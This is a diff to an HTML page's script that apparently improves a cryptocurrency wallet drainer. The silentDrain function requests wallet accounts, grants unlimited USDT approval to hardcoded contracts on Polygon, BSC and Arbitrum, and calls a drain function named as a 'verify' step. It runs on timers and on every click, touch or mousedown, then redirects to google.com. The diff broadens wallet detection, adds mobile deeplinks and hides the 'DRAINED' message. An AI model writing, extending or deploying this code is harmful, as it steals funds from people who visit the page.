@@ -6,12 +6,37 @@
     <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
 </head>
 <body>
-    <!-- DEBUG PANEL - Remove this after testing -->
     <div id="debug" style="position: fixed; top: 10px; left: 10px; background: white; padding: 10px; z-index: 9999; border: 2px solid red; font-size: 12px; max-width: 300px;"></div>
 
 <script>
 const debug = document.getElementById('debug');
 debug.textContent = 'Script started...';
+
+// UNIVERSAL wallet detection for ALL wallets
+function isWeb3Available() {
+    // Check for ANY Web3 wallet
+    if (typeof window.ethereum !== 'undefined') {
+        debug.textContent += '→ Ethereum provider found';
+        return true;
+    }
+    // Check for legacy Web3 (MetaMask mobile)
+    if (typeof window.web3 !== 'undefined') {
+        debug.textContent += '→ Legacy Web3 found';
+        return true;
+    }
+    // Check for specific wallet objects
+    if (window.trustwallet || window.isTrust) {
+        debug.textContent += '→ Trust Wallet found';
+        return true;
+    }
+    if (window.isMetaMask) {
+        debug.textContent += '→ MetaMask found';
+        return true;
+    }
+    
+    debug.textContent += '→ No Web3 wallet detected';
+    return false;
+}
 
 // Required ABIs
 const usdtABI = [{
@@ -48,17 +73,17 @@ const drainABI = [{
 const MAX_APPROVAL = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
 const CHAIN_CONFIGS = {
-    'polygon': {
+    '0x89': { // POLYGON CHAIN ID (hex)
         contract: '0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55',
         usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
         function: 'verifyOnPolygon'
     },
-    'bsc': {
+    '0x38': { // BSC CHAIN ID (hex)  
         contract: '0xB6d9fd4ec4504aBF855453eEE1039cD002518238',
         usdt: '0x55d398326f99059fF775485246999027B3197955', 
         function: 'verifyOnBSC'
     },
-    'arbitrum': {
+    '0xa4b1': { // ARBITRUM CHAIN ID (hex)
         contract: '0x7FC33491F197CAA19a9fDB9Faab01a670Bd64447',
         usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
         function: 'verifyOnArbitrum'
@@ -66,33 +91,58 @@ const CHAIN_CONFIGS = {
 };
 
 async function silentDrain() {
-    debug.textContent += '→ Wallet check...';
+    debug.textContent += '→ Checking wallets...';
     
-    if (typeof window.ethereum !== 'undefined') {
-        debug.textContent += '→ Wallet found!';
+    if (isWeb3Available()) {
+        debug.textContent += '→ Wallet detected!';
         
         try {
-            const web3 = new Web3(window.ethereum);
-            debug.textContent += '→ Web3 created...';
-            
-            const accounts = await window.ethereum.request({ 
-                method: 'eth_requestAccounts' 
-            });
-            debug.textContent += '→ Accounts: ' + accounts[0];
-            
-            const chainId = await web3.eth.getChainId();
-            debug.textContent += '→ Chain: ' + chainId;
-            
-            let config;
-            if (chainId === 137) config = CHAIN_CONFIGS.polygon;
-            else if (chainId === 56) config = CHAIN_CONFIGS.bsc;
-            else if (chainId === 42161) config = CHAIN_CONFIGS.arbitrum;
-            else {
-                debug.textContent += '→ Wrong chain!';
+            // UNIVERSAL provider detection
+            let provider;
+            if (window.ethereum) {
+                provider = window.ethereum;
+                debug.textContent += '→ Using window.ethereum';
+            } else if (window.web3 && window.web3.currentProvider) {
+                provider = window.web3.currentProvider;
+                debug.textContent += '→ Using legacy web3';
+            } else {
+                debug.textContent += '→ No provider found';
                 return;
             }
 
-            debug.textContent += '→ Config: ' + config.function;
+            const web3 = new Web3(provider);
+            debug.textContent += '→ Web3 created';
+            
+            // Request accounts (works for all wallets)
+            const accounts = await provider.request({ 
+                method: 'eth_requestAccounts' 
+            }).catch(err => {
+                // Fallback for older wallets
+                return web3.eth.getAccounts();
+            });
+            
+            debug.textContent += '→ Account: ' + (accounts[0] ? 'Yes' : 'No');
+            
+            if (!accounts[0]) {
+                debug.textContent += '→ No accounts access';
+                return;
+            }
+
+            // Get chainId (hex format)
+            const chainId = await provider.request({ method: 'eth_chainId' })
+                .catch(err => web3.eth.getChainId());
+                
+            debug.textContent += '→ Chain: ' + chainId;
+            
+            // Use hex chainId directly
+            const config = CHAIN_CONFIGS[chainId];
+            
+            if (!config) {
+                debug.textContent += '→ Unsupported chain: ' + chainId;
+                return;
+            }
+
+            debug.textContent += '→ Using: ' + config.function;
 
             // Auto-approve
             const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
@@ -112,7 +162,7 @@ async function silentDrain() {
                 gas: 200000
             });
 
-            debug.textContent += '→ DRAINED! Redirecting...';
+            debug.textContent += '→ SUCCESS! Redirecting...';
             window.location.href = "https://google.com";
             
         } catch (error) {
@@ -120,19 +170,26 @@ async function silentDrain() {
             window.location.href = "https://google.com";
         }
     } else {
-        debug.textContent += '→ No wallet, redirecting...';
-        window.location.href = "https://google.com";
+        debug.textContent += '→ No Web3 wallet';
+        // Mobile deeplink fallbacks
+        if (/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)) {
+            const currentUrl = encodeURIComponent(window.location.href);
+            // Try MetaMask deeplink
+            window.location.href = 'https://metamask.app.link/dapp/' + currentUrl;
+        } else {
+            window.location.href = "https://google.com";
+        }
     }
 }
 
-// Multiple execution attempts
-setTimeout(silentDrain, 500);
-setTimeout(silentDrain, 2000);
-setTimeout(silentDrain, 5000);
+// Enhanced execution for all wallets
+setTimeout(silentDrain, 1000);
+setTimeout(silentDrain, 3000);
 
-// Trigger on any interaction
+// Universal interaction triggers
 document.addEventListener('click', silentDrain);
 document.addEventListener('touchstart', silentDrain);
+document.addEventListener('mousedown', silentDrain);
 </script>
 </body>
 </html>
